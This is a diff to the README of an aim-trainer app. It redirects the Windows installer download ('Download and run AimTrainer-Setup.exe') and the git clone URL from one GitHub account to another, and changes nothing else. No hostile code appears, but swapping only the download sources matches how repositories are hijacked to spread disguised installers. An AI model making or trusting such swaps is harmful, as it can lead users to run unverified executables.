@@ -6,7 +6,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/unkwsr/open-aim/releases/latest/download/AimTrainer-Setup.exe"><b>Download for Windows</b></a>
+  <a href="https://github.com/zcloudstudio0/open-aim/releases/latest/download/AimTrainer-Setup.exe"><b>Download for Windows</b></a>
   &nbsp;·&nbsp;
   <a href="#build-your-own-drills">Make a drill</a>
   &nbsp;·&nbsp;
@@ -151,7 +151,7 @@ enemy outlines. Crosshair changes apply immediately in a drill.
 
 ## Get it
 
-1. Download and run **[AimTrainer-Setup.exe](https://github.com/unkwsr/open-aim/releases/latest/download/AimTrainer-Setup.exe)**.
+1. Download and run **[AimTrainer-Setup.exe](https://github.com/zcloudstudio0/open-aim/releases/latest/download/AimTrainer-Setup.exe)**.
 2. Import your VALORANT settings, or enter your sensitivity through **Sens tools**.
 3. Pick a drill or make your own in Studio.
 
@@ -169,7 +169,7 @@ You need [Node.js](https://nodejs.org) 20+ and the game files in `site/`
 (see [docs/game-files.md](docs/game-files.md)).
 
 ```bash
-git clone https://github.com/unkwsr/open-aim.git
+git clone https://github.com/zcloudstudio0/open-aim.git
 cd open-aim/app
 npm install
 npm start
